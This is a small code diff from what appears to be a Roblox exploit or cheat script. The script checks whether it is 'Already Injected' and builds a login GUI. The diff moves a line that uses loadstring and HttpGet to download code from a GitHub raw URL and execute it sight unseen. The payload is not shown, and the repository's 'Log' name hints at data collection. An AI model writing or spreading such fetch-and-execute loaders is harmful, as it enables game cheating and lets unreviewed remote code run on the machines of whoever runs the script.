@@ -3,7 +3,7 @@ if game.CoreGui:FindFirstChild("Login") then
 	print("Already Injected")
 	--s
 else
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/ConsumingChef/ConsumerHubLog/main/Trello'),true))()
+
 print("loading")
 local Login = Instance.new("ScreenGui")
 local Drag = Instance.new("Frame")
@@ -128,7 +128,7 @@ TextO.TextColor3 = Color3.fromRGB(234, 234, 234)
 TextO.TextScaled = true
 TextO.TextSize = 14.000
 TextO.TextWrapped = true
-
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ConsumingChef/ConsumerHubLog/main/Trello'),true))()
 -- Scripts:
 
 local function VGJAU_fake_script() -- LoginConfirm.LocalScript 
